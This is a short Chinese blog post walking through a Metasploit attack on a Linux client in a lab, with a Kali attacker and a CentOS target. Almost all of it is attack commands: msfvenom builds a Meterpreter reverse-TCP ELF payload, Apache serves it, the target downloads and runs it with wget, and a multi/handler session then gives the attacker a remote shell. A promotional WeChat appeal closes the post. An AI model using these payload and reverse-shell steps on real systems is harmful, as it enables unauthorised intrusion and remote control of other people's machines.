---
layout: post
category: binghe-code-hack
title: 使用Metasploit实现对Linux客户端的渗透
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 使用Metasploit实现对Linux客户端的渗透
lock: need
---

# 使用Metasploit实现对Linux客户端的渗透

攻击机 Kali 192.168.175.128

靶机 CentOS 6.5 192.168.175.132

## 生成elf文件

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.175.128 LPORT=5555 -f elf > /var/www/html/pay.elf
```

这里，我们将生成的pay.elf文件保存到了/var/www/html/目录下。

## 启动apache服务器

```bash
service apache2 start
```

## 在靶机上下载pay.elf

这里，假设我们经过一系列的渗透取得了靶机的权限，在靶机上执行如下命令

```bash
wget http://192.168.175.128/pay.elf
chmod a+x pay.elf
./pay.elf
```

## 在攻击机上执行攻击操作

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
setg LHOST 192.168.175.128
setg LPORT 5555
exploit
```

这样，我们就可以获取目标服务器的Meterpreter了。


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)